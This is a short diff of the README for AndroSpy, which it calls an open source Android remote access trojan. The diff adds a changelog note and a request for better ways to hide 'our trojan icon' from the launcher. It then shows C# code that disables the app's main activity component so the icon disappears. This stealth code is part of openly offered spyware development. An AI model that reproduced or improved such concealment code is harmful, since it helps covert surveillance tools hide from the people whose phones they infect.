@@ -36,7 +36,7 @@ AndroSpy Project aims to most powerful-stable-useful open source Android RAT.
 +Some visual changes.  
 +Added dropped Pin URL into the Location Manager  
 +Fixed terminate problem that caused by Ram Cleaner.  
-Note: I used to this code to hide our trojan icon from launcher but this doesn't work stable.  
+Note: I used to this code to hide our trojan icon from launcher but this doesn't work stable. if you find another solution please report me.  
 ```C#
 ComponentName componentName = new ComponentName(this, Java.Lang.Class.FromType(typeof(MainActivity)).Name);
 PackageManager.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
